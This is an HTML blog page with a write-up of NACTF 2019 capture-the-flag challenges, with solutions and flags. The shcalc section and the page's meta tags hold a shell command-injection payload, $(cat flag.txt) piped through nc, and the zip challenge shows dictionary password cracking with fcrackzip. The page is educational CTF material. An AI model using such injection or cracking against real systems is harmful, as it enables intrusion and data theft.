@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Newarkctf19 writeup - </title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Kad3cl" /><meta name="description" content="shcalc (200) Description Hint Solution  This is code injection
+  echo &#39;$(cat flag.txt | tr &amp;quot; &amp;quot; &amp;quot;.&amp;quot;) 2&amp;gt;&amp;amp;1&#39; | nc shell.2019.nactf.com 31214a
+ Flag  nactf{3v4l_1s_3v1l_dCf80yOo}  ==========================================
+BufferOverflow #0 (100) Description  The close cousin of a website for &amp;ldquo;Question marked as duplicate&amp;rdquo; Can you cause a segfault and get the flag? shell.2019.nactf.com:31475
+ Hint  What does it mean to overflow the buffer?
+ Solution Flag  nactf{0v3rfl0w_th4at_buff3r_18ghKusB}" />
+
+
+<meta name="robots" content="">
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0 with even 4.0.0" />
+
+
+<link rel="canonical" href="/post/newarkctf2019/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+<link href="/dist/even.58b28b82.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Newarkctf19 writeup" />
+<meta property="og:description" content="shcalc (200) Description Hint Solution  This is code injection
+  echo &#39;$(cat flag.txt | tr &quot; &quot; &quot;.&quot;) 2&gt;&amp;1&#39; | nc shell.2019.nactf.com 31214a
+ Flag  nactf{3v4l_1s_3v1l_dCf80yOo}  ==========================================
+BufferOverflow #0 (100) Description  The close cousin of a website for &ldquo;Question marked as duplicate&rdquo; Can you cause a segfault and get the flag? shell.2019.nactf.com:31475
+ Hint  What does it mean to overflow the buffer?
+ Solution Flag  nactf{0v3rfl0w_th4at_buff3r_18ghKusB}" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/post/newarkctf2019/" />
+<meta property="article:published_time" content="2019-09-22T22:36:51+00:00" />
+<meta property="article:modified_time" content="2019-09-22T22:36:51+00:00" />
+<meta itemprop="name" content="Newarkctf19 writeup">
+<meta itemprop="description" content="shcalc (200) Description Hint Solution  This is code injection
+  echo &#39;$(cat flag.txt | tr &quot; &quot; &quot;.&quot;) 2&gt;&amp;1&#39; | nc shell.2019.nactf.com 31214a
+ Flag  nactf{3v4l_1s_3v1l_dCf80yOo}  ==========================================
+BufferOverflow #0 (100) Description  The close cousin of a website for &ldquo;Question marked as duplicate&rdquo; Can you cause a segfault and get the flag? shell.2019.nactf.com:31475
+ Hint  What does it mean to overflow the buffer?
+ Solution Flag  nactf{0v3rfl0w_th4at_buff3r_18ghKusB}">
+
+
+<meta itemprop="datePublished" content="2019-09-22T22:36:51&#43;00:00" />
+<meta itemprop="dateModified" content="2019-09-22T22:36:51&#43;00:00" />
+<meta itemprop="wordCount" content="573">
+
+
+
+<meta itemprop="keywords" content="ctf,newarkctf," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Newarkctf19 writeup"/>
+<meta name="twitter:description" content="shcalc (200) Description Hint Solution  This is code injection
+  echo &#39;$(cat flag.txt | tr &quot; &quot; &quot;.&quot;) 2&gt;&amp;1&#39; | nc shell.2019.nactf.com 31214a
+ Flag  nactf{3v4l_1s_3v1l_dCf80yOo}  ==========================================
+BufferOverflow #0 (100) Description  The close cousin of a website for &ldquo;Question marked as duplicate&rdquo; Can you cause a segfault and get the flag? shell.2019.nactf.com:31475
+ Hint  What does it mean to overflow the buffer?
+ Solution Flag  nactf{0v3rfl0w_th4at_buff3r_18ghKusB}"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">KAD3CL</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">KAD3CL</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Newarkctf19 writeup</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2019-09-22 </span>
+        
+          <span class="more-meta"> 573 words </span>
+          <span class="more-meta"> 3 mins read </span>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#shcalc-200">shcalc (200)</a>
+<ul>
+<li>
+<ul>
+<li><a href="#description">Description</a></li>
+<li><a href="#hint">Hint</a></li>
+<li><a href="#solution">Solution</a></li>
+<li><a href="#flag">Flag</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#bufferoverflow-0-100">BufferOverflow #0 (100)</a>
+<ul>
+<li>
+<ul>
+<li><a href="#description-1">Description</a></li>
+<li><a href="#hint-1">Hint</a></li>
+<li><a href="#solution-1">Solution</a></li>
+<li><a href="#flag-1">Flag</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#unzip-me-150">Unzip Me (150)</a>
+<ul>
+<li>
+<ul>
+<li><a href="#description-2">Description</a></li>
+<li><a href="#hint-2">Hint</a></li>
+<li><a href="#solution-2">Solution</a></li>
+<li><a href="#flag-2">Flag</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#get-a-grep-0-100">GET a grep #0 (100)</a>
+<ul>
+<li>
+<ul>
+<li><a href="#description-3">Description</a></li>
+<li><a href="#solution-3">Solution</a></li>
+<li><a href="#flag-3">Flag</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#get-a-grep-1-125">GET a GREP#1 (125)</a>
+<ul>
+<li>
+<ul>
+<li><a href="#description-4">Description</a></li>
+<li><a href="#hint-3">Hint</a></li>
+<li><a href="#solution-4">Solution</a></li>
+<li><a href="#flag-4">Flag</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#filesystem-image-200">Filesystem Image (200)</a>
+<ul>
+<li>
+<ul>
+<li><a href="#description-5">Description</a></li>
+<li><a href="#hint-4">Hint</a></li>
+<li><a href="#solution-5">Solution</a></li>
+<li><a href="#flag-5">Flag</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#pink-panther-50">Pink Panther (50)</a>
+<ul>
+<li>
+<ul>
+<li><a href="#description-6">Description</a></li>
+<li><a href="#hint-5">Hint</a></li>
+<li><a href="#solution-6">Solution</a></li>
+<li><a href="#flag-6">Flag</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#cat-over-the-wire-50">Cat over the wire (50)</a>
+<ul>
+<li>
+<ul>
+<li><a href="#description-7">Description</a></li>
+<li><a href="#solution-7">Solution</a></li>
+<li><a href="#flag-7">Flag</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#vyom-s-soggy-croutons-50">Vyom&rsquo;s Soggy Croutons (50)</a>
+<ul>
+<li>
+<ul>
+<li><a href="#description-8">Description</a></li>
+<li><a href="#solution-8">Solution</a></li>
+<li><a href="#flag-8">Flag</a>
+<ul>
+<li>
+<ul>
+<li><a href="#i-ran-out-of-time-and-the-ctf-ended">I ran out of time and the ctf ended.</a></li>
+<li><a href="#my-final-score-was-1110-pts">My final score was 1110 pts</a></li>
+</ul></li>
+</ul></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      
+
+<h1 id="shcalc-200">shcalc (200)</h1>
+
+<h3 id="description">Description</h3>
+
+<p><img src="/images/newarkctf/shacalc200.png" alt="alt text" /></p>
+
+<h3 id="hint">Hint</h3>
+
+<p><img src="/images/newarkctf/shacalc200hint.png" alt="alt text" /></p>
+
+<h3 id="solution">Solution</h3>
+
+<blockquote>
+<p>This is code injection</p>
+</blockquote>
+
+<p><img src="/images/newarkctf/shacalc200injected1.png" alt="alt text" /></p>
+
+<blockquote>
+<p><code>echo '$(cat flag.txt | tr &quot; &quot; &quot;.&quot;) 2&gt;&amp;1'  |  nc shell.2019.nactf.com 31214a</code></p>
+</blockquote>
+
+<h3 id="flag">Flag</h3>
+
+<blockquote>
+<p><code>nactf{3v4l_1s_3v1l_dCf80yOo}</code>
+<img src="/images/newarkctf/shacalcflag.png" alt="alt text" /></p>
+</blockquote>
+
+<p>==========================================</p>
+
+<h1 id="bufferoverflow-0-100">BufferOverflow #0 (100)</h1>
+
+<h3 id="description-1">Description</h3>
+
+<blockquote>
+<p>The close cousin of a website for &ldquo;Question marked as duplicate&rdquo;
+Can you cause a segfault and get the flag?
+shell.2019.nactf.com:31475</p>
+</blockquote>
+
+<h3 id="hint-1">Hint</h3>
+
+<blockquote>
+<p>What does it mean to overflow the buffer?</p>
+</blockquote>
+
+<h3 id="solution-1">Solution</h3>
+
+<p><img src="/images/newarkctf/bufferoverflow0.png" alt="alt text" /></p>
+
+<h3 id="flag-1">Flag</h3>
+
+<blockquote>
+<p><code>nactf{0v3rfl0w_th4at_buff3r_18ghKusB}</code></p>
+</blockquote>
+
+<p>==========================================</p>
+
+<h1 id="unzip-me-150">Unzip Me (150)</h1>
+
+<h3 id="description-2">Description</h3>
+
+<blockquote>
+<p>I stole these files off of  The20thDucks&rsquo; computer, but it seems he was smart enough to put a  password on them. Can you unzip them for me?
+ Given three password protrected zip files<br />
+zip1.zip
+zip2.zip
+zip3.zip</p>
+</blockquote>
+
+<h3 id="hint-2">Hint</h3>
+
+<blockquote>
+<p>There are many tools that can crack zip files for you</p>
+
+<p>All the passwords are real words and all lowercase</p>
+</blockquote>
+
+<h3 id="solution-2">Solution</h3>
+
+<blockquote>
+<p>I used fcrackzip to crack zip files</p>
+</blockquote>
+
+<p><code>fcrackzip  -u -D -p  /usr/share/wordlists/rockyou.txt zip1.zip</code></p>
+
+<p><code>PASSWORD FOUND!!!!: pw == dictionary</code></p>
+
+<p><code>fcrackzip  -u -D -p  /usr/share/wordlists/rockyou.txt zip2.zip</code></p>
+
+<p><code>PASSWORD FOUND!!!!: pw == rock</code></p>
+
+<p><code>fcrackzip  -u -D -p  /usr/share/wordlists/rockyou.txt zip3.zip</code></p>
+
+<p><code>PASSWORD FOUND!!!!: pw == dog</code></p>
+
+<blockquote>
+<p><code>strings zip1.rtf</code></p>
+
+<p><code>{\rtf1\ansi\ansicpg1252\cocoartf1671\cocoasubrtf500
+{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
+{\colortbl;\red255\green255\blue255;}
+{\*\expandedcolortbl;;}
+\margl1440\margr1440\vieww10800\viewh8400\viewkind0
+\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
+\f0\fs24 \cf0 nactf\{w0w}</code></p>
+</blockquote>
+
+<p><img src="/images/newarkctf/unzipme150-zip1.png" alt="alt text" />
+<img src="/images/newarkctf/unzipme150-zip2.png" alt="alt text" />
+<img src="/images/newarkctf/unzipme150-zip3.png" alt="alt text" />
+<img src="/images/newarkctf/unzipme150-zip4.png" alt="alt text" />
+<img src="/images/newarkctf/unzipme150-zip5.png" alt="alt text" /></p>
+
+<h3 id="flag-2">Flag</h3>
+
+<blockquote>
+<p><code>nactf{w0w_y0u_unz1pp3d_m3}</code></p>
+</blockquote>
+
+<p>==========================================</p>
+
+<h1 id="get-a-grep-0-100">GET a grep #0 (100)</h1>
+
+<h3 id="description-3">Description</h3>
+
+<blockquote>
+<p>Vikram was climbing a chunky tree when he  decided to hide a flag on one of the leaves. There are 10,000 leaves so  there&rsquo;s no way you can find the right one in time&hellip; Can you open up a  terminal window and get a grep on the flag?
+give a bigtree.zip file with a bunch of folders</p>
+</blockquote>
+
+<h3 id="solution-3">Solution</h3>
+
+<blockquote>
+<p><code>grep -ri &quot;nactf&quot;</code></p>
+
+<p><code>branch8/branch3/branch5/leaf8351.txt</code></p>
+</blockquote>
+
+<p><img src="/images/newarkctf/getgrep0.png" alt="alt text" /></p>
+
+<h3 id="flag-3">Flag</h3>
+
+<blockquote>
+<p><code>nactf{v1kram_and_h1s_10000_l3av3s}</code></p>
+</blockquote>
+
+<p>==========================================</p>
+
+<h1 id="get-a-grep-1-125">GET a GREP#1 (125)</h1>
+
+<h3 id="description-4">Description</h3>
+
+<blockquote>
+<p>Juliet hid a flag among 100,000  dummy ones so I don&rsquo;t know which one is real! But maybe the format of  her flag is predictable? I know sometimes people add random characters  to the end of flags&hellip; I think she put 7 random vowels at the end of  hers. Can you get a GREP on this flag?
+ We give a flag.txt full of 10,000 flags</p>
+</blockquote>
+
+<h3 id="hint-3">Hint</h3>
+
+<blockquote>
+<p>Look up regular expressions (regex) and the regex option in grep!</p>
+</blockquote>
+
+<h3 id="solution-4">Solution</h3>
+
+<blockquote>
+<p><code>grep -iE '[aeiou]{7}' flag.txt</code></p>
+</blockquote>
+
+<p><img src="/images/newarkctf/getagrep1.png" alt="alt text" /></p>
+
+<h3 id="flag-4">Flag</h3>
+
+<blockquote>
+<p><code>nactf{r3gul4r_3xpr3ss10ns_ar3_m0r3_th4n_r3gul4r_euaiooa}</code></p>
+</blockquote>
+
+<p>==========================================</p>
+
+<h1 id="filesystem-image-200">Filesystem Image (200)</h1>
+
+<h3 id="description-5">Description</h3>
+
+<blockquote>
+<p>Put the path to flag.txt together to get the flag! for example, if it was located at ab/cd/ef/gh/ij/flag.txt, your flag would be nactf{abcdefghij}</p>
+</blockquote>
+
+<h3 id="hint-4">Hint</h3>
+
+<blockquote>
+<p>Check out loop devices on Linux</p>
+</blockquote>
+
+<h3 id="solution-5">Solution</h3>
+
+<blockquote>
+<p><code>sudo  mount -o loop,offset=512 fsimage.iso /media/</code></p>
+
+<p><code>find /media/ -iname &quot;flag.txt&quot;</code>
+<code>/media/lq/wk/zo/py/hu/flag.txt</code></p>
+
+<p><code>cat /media/lq/wk/zo/py/hu/flag.txt</code></p>
+
+<p><code>They'll never find this! HAhahAHahAHAHaHAHAHAA
+&gt;:)</code></p>
+</blockquote>
+
+<p><img src="/images/newarkctf/fsimage0.png" alt="alt text" /></p>
+
+<h3 id="flag-5">Flag</h3>
+
+<blockquote>
+<p><code>nactf{lqwkzopyhu}</code></p>
+</blockquote>
+
+<p>==========================================</p>
+
+<h1 id="pink-panther-50">Pink Panther (50)</h1>
+
+<h3 id="description-6">Description</h3>
+
+<blockquote>
+<p>Rahul loves the Pink Panther. He even made this website: <a href="http://pinkpanther.web.2019.nactf.com">http://pinkpanther.web.2019.nactf.com</a>. I think he hid a message somewhere on the webpage, but I don&rsquo;t know where&hellip; can you INSPECT and find the message? <a href="https://www.youtube.com/watch?v=2HMSnfeNf8c">https://www.youtube.com/watch?v=2HMSnfeNf8c</a></p>
+</blockquote>
+
+<h3 id="hint-5">Hint</h3>
+
+<blockquote>
+<p>First thing to do with web exploitation is to check page source code`</p>
+</blockquote>
+
+<h3 id="solution-6">Solution</h3>
+
+<p><img src="/images/newarkctf/pinkpanther1.png" alt="alt text" /></p>
+
+<h3 id="flag-6">Flag</h3>
+
+<p><img src="/images/newarkctf/pinkpantherflag.png" alt="alt text" />
+&gt; <code>nactf{1nsp3ct_b3tter_7han_c10us3au}</code></p>
+
+<p>==========================================</p>
+
+<h1 id="cat-over-the-wire-50">Cat over the wire (50)</h1>
+
+<h3 id="description-7">Description</h3>
+
+<blockquote>
+<p>Open up a terminal and connect to the server at shell.2019.nactf.com on port 31242 and get the flag!
+ Use this netcat command in terminal:
+ nc shell.2019.nactf.com 31242</p>
+</blockquote>
+
+<h3 id="solution-7">Solution</h3>
+
+<blockquote>
+<p>The solution was given
+<code>user@csaw-nyu-19:~/Downloads$ nc shell.2019.nactf.com 31242</code></p>
+</blockquote>
+
+<h3 id="flag-7">Flag</h3>
+
+<p><code>nactf{th3_c4ts_0ut_0f_th3_b4g}</code></p>
+
+<p>==========================================</p>
+
+<h1 id="vyom-s-soggy-croutons-50">Vyom&rsquo;s Soggy Croutons (50)</h1>
+
+<h3 id="description-8">Description</h3>
+
+<blockquote>
+<p>Vyom was eating a CAESAR salad with a bunch of wet croutons when he sent me this:
+ ertkw{vk_kl_silkv}
+ Can you help me decipher his message?</p>
+</blockquote>
+
+<h3 id="solution-8">Solution</h3>
+
+<blockquote>
+<p>The caesar salad was a big hint for that this was caesar encrypted
+<a href="https://cryptii.com/pipes/caesar-cipher">https://cryptii.com/pipes/caesar-cipher</a><br />
+ceasar cipher shift by 9 and you will get flag</p>
+</blockquote>
+
+<h3 id="flag-8">Flag</h3>
+
+<p><code>nactf{et_tu_brute}</code></p>
+
+<p>==========================================</p>
+
+<h5 id="i-ran-out-of-time-and-the-ctf-ended">I ran out of time and the ctf ended.</h5>
+
+<h5 id="my-final-score-was-1110-pts">My final score was 1110 pts</h5>
+
+<p><img src="/images/newarkctf/kad3cl_total-points.png" alt="alt text" />
+<img src="/images/newarkctf/kad3cl-solved-challenges.png" alt="alt text" /></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">
+      <a href="">Kad3cl</a>
+    </span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title"></span>
+    <span class="item-content">
+        2019-09-22
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title"></span>
+    <span class="item-content">
+        <a href="/post/newarkctf2019/">/post/newarkctf2019/</a>
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/ctf/">ctf</a>
+          <a href="/tags/newarkctf/">newarkctf</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="/post/hackthebox-netmon/">
+            <span class="next-text nav-default">HackTheBox - Netmon WT</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="http://localhost:1313" class="iconfont icon-github" title="github"></a>
+  <a href="/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+     - 
+    2019
+    <span class="heart">
+<style>.heart{color:#e25555;}</style>
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">kad3cl</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  <script src="/lib/highlight/highlight.pack.js?v=20171001"></script>
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+<script type="text/javascript" src="/dist/even.26188efa.min.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
